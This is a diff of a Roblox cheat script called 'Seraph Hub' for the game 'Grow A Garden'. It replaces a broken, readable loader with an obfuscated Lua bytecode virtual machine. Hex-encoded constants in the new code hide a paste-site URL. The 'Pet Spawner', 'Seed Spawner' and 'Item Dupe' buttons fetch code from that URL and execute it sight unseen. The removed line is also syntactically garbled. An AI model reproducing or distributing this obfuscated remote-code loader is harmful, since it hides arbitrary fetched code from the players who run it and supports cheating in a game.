@@ -1,1 +1,373 @@
-local v0=loadstring(game:HttpGet("https://sirius.menu/rayfield"))();local v1=v0:CreateWindow({Name="Seraph Hub",Icon=10800749662 -(993 + 357) ,LoadingTitle="Seraph Hub",LoadingSubtitle="by Seraphim",Theme="Default",ToggleUIKeybind="K",DisableRayfieldPrompts=false,DisableBuildWarnings=false,ConfigurationSaving={Enabled=true,FolderName=nil,FileName="Big Hub"},Discord={Enabled=false,Invite="noinvitelink",RememberJoins=true},KeySystem=false,KeySettings={Title="Untitled",Subtitle="Key System",Note="No method of obtaining the key is provided",FileName="Key",SaveKey=true,GrabKeyFromSite=false,Key={"Hello"}}});local v2=v1:CreateTab("Grow A Garden",4483363389 -(857 + 74) );local v3=Tab:CreateSection("Grow A Garden Script");local v4="loadstring(game:HttpGet(";https:CreateButton({Name="Pet Spawner",Callback=function() loadstring(game:HttpGet(v4))();end});v2:CreateButton({Name="Seed Spawner",Callback=function() loadstring(game:HttpGet(v4))();end});v2:CreateButton({Name="Item Dupe",Callback=function() loadstring(game:HttpGet(v4))();end});
+local StrToNumber = tonumber;
+local Byte = string.byte;
+local Char = string.char;
+local Sub = string.sub;
+local Subg = string.gsub;
+local Rep = string.rep;
+local Concat = table.concat;
+local Insert = table.insert;
+local LDExp = math.ldexp;
+local GetFEnv = getfenv or function()
+	return _ENV;
+end;
+local Setmetatable = setmetatable;
+local PCall = pcall;
+local Select = select;
+local Unpack = unpack or table.unpack;
+local ToNumber = tonumber;
+local function VMCall(ByteString, vmenv, ...)
+	local DIP = 1;
+	local repeatNext;
+	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
+		if (Byte(byte, 2) == 81) then
+			repeatNext = StrToNumber(Sub(byte, 1, 1));
+			return "";
+		else
+			local a = Char(StrToNumber(byte, 16));
+			if repeatNext then
+				local b = Rep(a, repeatNext);
+				repeatNext = nil;
+				return b;
+			else
+				return a;
+			end
+		end
+	end);
+	local function gBit(Bit, Start, End)
+		if End then
+			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
+			return Res - (Res % 1);
+		else
+			local Plc = 2 ^ (Start - 1);
+			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
+		end
+	end
+	local function gBits8()
+		local a = Byte(ByteString, DIP, DIP);
+		DIP = DIP + 1;
+		return a;
+	end
+	local function gBits16()
+		local a, b = Byte(ByteString, DIP, DIP + 2);
+		DIP = DIP + 2;
+		return (b * 256) + a;
+	end
+	local function gBits32()
+		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
+		DIP = DIP + 4;
+		return (d * 16777216) + (c * 65536) + (b * 256) + a;
+	end
+	local function gFloat()
+		local Left = gBits32();
+		local Right = gBits32();
+		local IsNormal = 1;
+		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
+		local Exponent = gBit(Right, 21, 31);
+		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
+		if (Exponent == 0) then
+			if (Mantissa == 0) then
+				return Sign * 0;
+			else
+				Exponent = 1;
+				IsNormal = 0;
+			end
+		elseif (Exponent == 2047) then
+			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
+		end
+		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
+	end
+	local function gString(Len)
+		local Str;
+		if not Len then
+			Len = gBits32();
+			if (Len == 0) then
+				return "";
+			end
+		end
+		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
+		DIP = DIP + Len;
+		local FStr = {};
+		for Idx = 1, #Str do
+			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
+		end
+		return Concat(FStr);
+	end
+	local gInt = gBits32;
+	local function _R(...)
+		return {...}, Select("#", ...);
+	end
+	local function Deserialize()
+		local Instrs = {};
+		local Functions = {};
+		local Lines = {};
+		local Chunk = {Instrs,Functions,nil,Lines};
+		local ConstCount = gBits32();
+		local Consts = {};
+		for Idx = 1, ConstCount do
+			local Type = gBits8();
+			local Cons;
+			if (Type == 1) then
+				Cons = gBits8() ~= 0;
+			elseif (Type == 2) then
+				Cons = gFloat();
+			elseif (Type == 3) then
+				Cons = gString();
+			end
+			Consts[Idx] = Cons;
+		end
+		Chunk[3] = gBits8();
+		for Idx = 1, gBits32() do
+			local Descriptor = gBits8();
+			if (gBit(Descriptor, 1, 1) == 0) then
+				local Type = gBit(Descriptor, 2, 3);
+				local Mask = gBit(Descriptor, 4, 6);
+				local Inst = {gBits16(),gBits16(),nil,nil};
+				if (Type == 0) then
+					Inst[3] = gBits16();
+					Inst[4] = gBits16();
+				elseif (Type == 1) then
+					Inst[3] = gBits32();
+				elseif (Type == 2) then
+					Inst[3] = gBits32() - (2 ^ 16);
+				elseif (Type == 3) then
+					Inst[3] = gBits32() - (2 ^ 16);
+					Inst[4] = gBits16();
+				end
+				if (gBit(Mask, 1, 1) == 1) then
+					Inst[2] = Consts[Inst[2]];
+				end
+				if (gBit(Mask, 2, 2) == 1) then
+					Inst[3] = Consts[Inst[3]];
+				end
+				if (gBit(Mask, 3, 3) == 1) then
+					Inst[4] = Consts[Inst[4]];
+				end
+				Instrs[Idx] = Inst;
+			end
+		end
+		for Idx = 1, gBits32() do
+			Functions[Idx - 1] = Deserialize();
+		end
+		return Chunk;
+	end
+	local function Wrap(Chunk, Upvalues, Env)
+		local Instr = Chunk[1];
+		local Proto = Chunk[2];
+		local Params = Chunk[3];
+		return function(...)
+			local Instr = Instr;
+			local Proto = Proto;
+			local Params = Params;
+			local _R = _R;
+			local VIP = 1;
+			local Top = -1;
+			local Vararg = {};
+			local Args = {...};
+			local PCount = Select("#", ...) - 1;
+			local Lupvals = {};
+			local Stk = {};
+			for Idx = 0, PCount do
+				if (Idx >= Params) then
+					Vararg[Idx - Params] = Args[Idx + 1];
+				else
+					Stk[Idx] = Args[Idx + 1];
+				end
+			end
+			local Varargsz = (PCount - Params) + 1;
+			local Inst;
+			local Enum;
+			while true do
+				Inst = Instr[VIP];
+				Enum = Inst[1];
+				if (Enum <= 16) then
+					if (Enum <= 7) then
+						if (Enum <= 3) then
+							if (Enum <= 1) then
+								if (Enum > 0) then
+									Stk[Inst[2]] = Inst[3];
+								else
+									Stk[Inst[2]] = Inst[3];
+								end
+							elseif (Enum == 2) then
+								Stk[Inst[2]][Inst[3]] = Inst[4];
+							else
+								local A = Inst[2];
+								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+								Top = (Limit + A) - 1;
+								local Edx = 0;
+								for Idx = A, Top do
+									Edx = Edx + 1;
+									Stk[Idx] = Results[Edx];
+								end
+							end
+						elseif (Enum <= 5) then
+							if (Enum == 4) then
+								Stk[Inst[2]]();
+							else
+								do
+									return;
+								end
+							end
+						elseif (Enum == 6) then
+							local A = Inst[2];
+							Stk[A] = Stk[A]();
+						else
+							local A = Inst[2];
+							Stk[A](Unpack(Stk, A + 1, Inst[3]));
+						end
+					elseif (Enum <= 11) then
+						if (Enum <= 9) then
+							if (Enum > 8) then
+								Stk[Inst[2]] = Env[Inst[3]];
+							else
+								Stk[Inst[2]]();
+							end
+						elseif (Enum == 10) then
+							local A = Inst[2];
+							local T = Stk[A];
+							local B = Inst[3];
+							for Idx = 1, B do
+								T[Idx] = Stk[A + Idx];
+							end
+						else
+							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+						end
+					elseif (Enum <= 13) then
+						if (Enum == 12) then
+							Stk[Inst[2]] = {};
+						else
+							Stk[Inst[2]] = Upvalues[Inst[3]];
+						end
+					elseif (Enum <= 14) then
+						local A = Inst[2];
+						Stk[A] = Stk[A]();
+					elseif (Enum == 15) then
+						local NewProto = Proto[Inst[3]];
+						local NewUvals;
+						local Indexes = {};
+						NewUvals = Setmetatable({}, {__index=function(_, Key)
+							local Val = Indexes[Key];
+							return Val[1][Val[2]];
+						end,__newindex=function(_, Key, Value)
+							local Val = Indexes[Key];
+							Val[1][Val[2]] = Value;
+						end});
+						for Idx = 1, Inst[4] do
+							VIP = VIP + 1;
+							local Mvm = Instr[VIP];
+							if (Mvm[1] == 32) then
+								Indexes[Idx - 1] = {Stk,Mvm[3]};
+							else
+								Indexes[Idx - 1] = {Upvalues,Mvm[3]};
+							end
+							Lupvals[#Lupvals + 1] = Indexes;
+						end
+						Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
+					else
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+					end
+				elseif (Enum <= 24) then
+					if (Enum <= 20) then
+						if (Enum <= 18) then
+							if (Enum == 17) then
+								Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
+							else
+								Stk[Inst[2]] = Env[Inst[3]];
+							end
+						elseif (Enum == 19) then
+							local NewProto = Proto[Inst[3]];
+							local NewUvals;
+							local Indexes = {};
+							NewUvals = Setmetatable({}, {__index=function(_, Key)
+								local Val = Indexes[Key];
+								return Val[1][Val[2]];
+							end,__newindex=function(_, Key, Value)
+								local Val = Indexes[Key];
+								Val[1][Val[2]] = Value;
+							end});
+							for Idx = 1, Inst[4] do
+								VIP = VIP + 1;
+								local Mvm = Instr[VIP];
+								if (Mvm[1] == 32) then
+									Indexes[Idx - 1] = {Stk,Mvm[3]};
+								else
+									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
+								end
+								Lupvals[#Lupvals + 1] = Indexes;
+							end
+							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
+						else
+							Stk[Inst[2]] = Upvalues[Inst[3]];
+						end
+					elseif (Enum <= 22) then
+						if (Enum > 21) then
+							Stk[Inst[2]][Inst[3]] = Inst[4];
+						else
+							local A = Inst[2];
+							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+						end
+					elseif (Enum > 23) then
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+					else
+						local A = Inst[2];
+						local B = Stk[Inst[3]];
+						Stk[A + 1] = B;
+						Stk[A] = B[Inst[4]];
+					end
+				elseif (Enum <= 28) then
+					if (Enum <= 26) then
+						if (Enum == 25) then
+							local A = Inst[2];
+							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+							Top = (Limit + A) - 1;
+							local Edx = 0;
+							for Idx = A, Top do
+								Edx = Edx + 1;
+								Stk[Idx] = Results[Edx];
+							end
+						else
+							local A = Inst[2];
+							Stk[A](Unpack(Stk, A + 1, Inst[3]));
+						end
+					elseif (Enum == 27) then
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
+					else
+						local A = Inst[2];
+						local T = Stk[A];
+						local B = Inst[3];
+						for Idx = 1, B do
+							T[Idx] = Stk[A + Idx];
+						end
+					end
+				elseif (Enum <= 30) then
+					if (Enum > 29) then
+						Stk[Inst[2]] = {};
+					else
+						do
+							return;
+						end
+					end
+				elseif (Enum <= 31) then
+					local A = Inst[2];
+					local T = Stk[A];
+					for Idx = A + 1, Inst[3] do
+						Insert(T, Stk[Idx]);
+					end
+				elseif (Enum > 32) then
+					local A = Inst[2];
+					local B = Stk[Inst[3]];
+					Stk[A + 1] = B;
+					Stk[A] = B[Inst[4]];
+				else
+					Stk[Inst[2]] = Stk[Inst[3]];
+				end
+				VIP = VIP + 1;
+			end
+		end;
+	end
+	return Wrap(Deserialize(), {}, vmenv)(...);
+end
+return VMCall("LOL!353Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574031C3Q00682Q7470733A2Q2F7369726975732E6D656E752F7261796669656C64030C3Q0043726561746557696E646F7703043Q004E616D65030A3Q005365726170682048756203043Q0049636F6E022Q00C0B8321E0442030C3Q004C6F6164696E675469746C65030F3Q004C6F6164696E675375627469746C65030B3Q00627920536572617068696D03053Q005468656D6503073Q0044656661756C74030F3Q00546F2Q676C6555494B657962696E6403013Q004B03163Q0044697361626C655261796669656C6450726F6D707473010003143Q0044697361626C654275696C645761726E696E677303133Q00436F6E66696775726174696F6E536176696E6703073Q00456E61626C65642Q01030A3Q00466F6C6465724E616D650003083Q0046696C654E616D6503073Q004269672048756203073Q00446973636F726403063Q00496E76697465030C3Q006E6F696E766974656C696E6B030D3Q0052656D656D6265724A6F696E7303093Q004B657953797374656D030B3Q004B657953652Q74696E677303053Q005469746C6503083Q00556E7469746C656403083Q005375627469746C65030A3Q004B65792053797374656D03043Q004E6F7465032A3Q004E6F206D6574686F64206F66206F627461696E696E6720746865206B65792069732070726F76696465642Q033Q004B657903073Q00536176654B6579030F3Q00477261624B657946726F6D5369746503053Q0048652Q6C6F031B3Q00682Q7470733A2Q2F70617374652E2Q652F722F3870346A33436A7303093Q00437265617465546162030D3Q0047726F7720412047617264656E022Q00A0E9AAB3F041030D3Q0043726561746553656374696F6E03143Q0047726F7720412047617264656E20536372697074030C3Q0043726561746542752Q746F6E030B3Q0050657420537061776E657203083Q0043612Q6C6261636B030C3Q00532Q656420537061776E657203093Q004974656D204475706500473Q002Q123Q00013Q002Q12000100023Q00202100010001000300122Q000300044Q0019000100034Q00185Q00022Q000E3Q0001000200202100013Q00052Q001E00033Q000C0030020003000600070030020003000800090030020003000A00070030020003000B000C0030020003000D000E0030020003000F00100030020003001100120030020003001300122Q001E00043Q000300300200040015001600300200040017001800300200040019001A00100B0003001400042Q001E00043Q00030030020004001500120030020004001C001D0030020004001E001600100B0003001B00040030020003001F00122Q001E00043Q00070030020004002100220030020004002300240030020004002500260030020004001900270030020004002800160030020004002900122Q001E000500013Q00122Q0006002A4Q000A00050001000100100B00040027000500100B0003002000042Q001500010003000200122Q0002002B3Q00202100030001002C00122Q0005002D3Q00122Q0006002E4Q001500030006000200202100040003002F00122Q000600304Q00150004000600020020210005000300312Q001E00073Q000200300200070006003200061300083Q000100012Q00203Q00023Q00100B0007003300082Q001A0005000700010020210005000300312Q001E00073Q000200300200070006003400061300080001000100012Q00203Q00023Q00100B0007003300082Q001A0005000700010020210005000300312Q001E00073Q000200300200070006003500061300080002000100012Q00203Q00023Q00100B0007003300082Q001A0005000700012Q001D3Q00013Q00033Q00033Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657400083Q002Q123Q00013Q002Q12000100023Q0020210001000100032Q000D00036Q0019000100034Q00185Q00022Q00043Q000100012Q001D3Q00017Q00033Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657400083Q002Q123Q00013Q002Q12000100023Q0020210001000100032Q000D00036Q0019000100034Q00185Q00022Q00043Q000100012Q001D3Q00017Q00033Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657400083Q002Q123Q00013Q002Q12000100023Q0020210001000100032Q000D00036Q0019000100034Q00185Q00022Q00043Q000100012Q001D3Q00017Q00", GetFEnv(), ...);
